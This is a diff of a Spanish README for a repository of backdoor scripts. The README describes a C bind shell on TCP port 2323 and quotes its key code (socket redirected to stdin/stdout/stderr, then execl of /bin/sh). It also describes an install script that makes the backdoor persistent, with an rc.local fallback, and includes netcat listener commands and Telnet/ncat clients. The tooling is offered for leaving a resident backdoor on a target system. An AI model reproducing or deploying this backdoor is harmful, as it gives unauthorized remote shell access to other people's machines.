@@ -5,50 +5,69 @@
 ### puertatrasera
 Simples Script en distintos lenguakes, para crear una backdoor o puertra trasera
 
-### instalar.sh 
-( Ejecutar sh instalar.sh para instalar en el sistema que queremos dejar el backdoor residente ). 
-Si no funciona editamos el fichero rc.local e incluimos la linea con el scipt:
+---
 
-vi /etc/rc.local
+## 📋 Tabla de Contenido
 
-/sbin/backdoor
+- [Características](#-características)
+- [Archivos del Repositorio](#-archivos-del-repositorio)
+- [Detalles de los Scripts](#-detalles-de-los-scripts)
+- [Instalación y Uso](#-instalación-y-uso)
+- [Ejemplos de Backdoors Alternativos](#-ejemplos-de-backdoors-alternativos)
+- [Puertas Traseras en Dispositivos Reales (Contexto)](#-puertas-traseras-en-dispositivos-reales-contexto)
+- [Seguridad y Advertencias](#-seguridad-y-advertencias)
+- [Licencia](#-licencia)
 
-Otros comandos:
+---
 
-### netcat
+## ✨ Características
 
-while true ; do nc -l 8000 < index.html ; done
+- Backdoor en C compilado (persistente)
+- Script de instalación automática (`instalar.sh`)
+- Cliente Telnet/NC simple (Linux y Windows)
+- Ejemplos de servidores web temporales en múltiples lenguajes
+- Documentación adicional sobre backdoors en routers Huawei y contexto de seguridad
 
-ó
+---
 
-rlwrap nc -lvnp 8080
+## 📁 Archivos del Repositorio
 
-### backdoor ( Se instala como un proceso en Linux. Puerto tcp 2323 )
+| Archivo                  | Tipo       | Descripción                                      | Idioma    |
+|--------------------------|------------|--------------------------------------------------|-----------|
+| `backdoor.c`            | Fuente     | Código fuente del backdoor en C                  | C         |
+| `backdoor`              | Binario/Script | Backdoor compilado (shell wrapper)              | Shell     |
+| `instalar.sh`           | Script     | Instalación como servicio persistente            | Bash      |
+| `telnetcliente`         | Script     | Cliente para conectarse desde Linux              | Bash      |
+| `telnetcliente.bat`     | Script     | Cliente para Windows (usa ncat)                  | Batch     |
+| `puertastraseras.md`    | Documento  | Análisis de backdoors en routers Huawei          | Markdown  |
+| `Informe_2023.md`       | Documento  | Resumen del informe HCSEC sobre Huawei           | Markdown  |
+| `README.md`             | Documento  | Este archivo                                     | Markdown  |
+| `LICENSE`               | Legal      | GPL-3.0                                          | -         |
 
-### telnetcliente IP ( cliente telnet para acceder )
+---
 
-### busybox httpd
+## 🔍 Detalles de los Scripts
 
-busybox httpd -f -p 8000
+### 1. `backdoor.c` (Backdoor en C)
 
-### Python 2.x
+**Función principal:** Servidor TCP que abre un shell al conectarse.
 
-python -m SimpleHTTPServer 8000
+**Características técnicas:**
 
-### Python 3.x
+- Puerto: **TCP 2323**
+- Escucha en todas las interfaces (`INADDR_ANY`)
+- Soporta múltiples conexiones (fork por cliente)
+- Redirige `stdin/stdout/stderr` al socket
+- Ejecuta `/bin/sh` o `/bin/bash`
+- Mensajes informativos en consola
 
-python -m http.server 8000
-
-### Ruby
-
-ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 8000, :DocumentRoot => Dir.pwd).start'
-
-### Ruby 1.9.2+
-
-ruby -run -ehttpd . -p8000
-
-### Php
-php -S 127.0.0.1:8000
-
+```c
+// Fragmento clave
+address.sin_port = htons(2323);
+...
+dup2(client_fd, 0);  // stdin
+dup2(client_fd, 1);  // stdout
+dup2(client_fd, 2);  // stderr
+execl("/bin/sh", "sh", NULL);
 
 
